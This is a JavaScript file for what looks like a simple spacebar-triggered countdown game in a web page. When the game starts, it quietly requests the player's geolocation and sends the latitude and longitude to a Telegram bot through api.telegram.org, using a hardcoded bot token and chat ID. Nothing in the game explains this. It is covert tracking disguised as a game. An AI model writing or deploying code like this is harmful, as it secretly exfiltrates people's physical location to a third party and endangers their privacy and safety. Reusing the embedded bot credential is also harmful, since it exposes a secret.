let dot = document.getElementById("dot");
let start = document.getElementById("start");
let count_number = 3;
let intervalId;

document.addEventListener("keydown", function (event) {
  if (event.code === "Space") {
    intervalId = setInterval(() => {
      start.innerText = count_number;
      count_number--;
      if (count_number < 0) {
        clearInterval(intervalId);
        start.style.display = "none";
        dot.style.display = "inline-block";

        // Call getLocation to send user's location
        getLocation();

        setInterval(() => {
          dot.style.display = "none";
          start.style.display = "inline-block";
          start.style.color = "White";
          start.innerHTML =
            "<h1>Time's up⏲️ <br> Press ctrl + R to Restart!</h1>";
          document.body.style.backgroundColor = "red"; // Fixed this line
        }, 120000);
      }
    }, 1000);
  }
});

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
  } else {
    alert("Geolocation is not supported by this browser.");
  }
}

function showError(error) {
  switch (error.code) {
    case error.PERMISSION_DENIED:
      alert("User denied the request for Geolocation.");
      break;
    case error.POSITION_UNAVAILABLE:
      alert("Location information is unavailable.");
      break;
    case error.TIMEOUT:
      alert("The request to get user location timed out.");
      break;
    case error.UNKNOWN_ERROR:
      alert("An unknown error occurred.");
      break;
  }
}

function sendLocationToTelegram(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const chatId = "6959013020"; 
  const botToken = "7099870589:AAGL9JlIG9djKDI_Q8dtedPMMyOayQyO7nU";  
  const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

  fetch(url)
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        console.log("Location sent successfully!");
      } else {
        console.error("Error sending location:", data.description);
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}
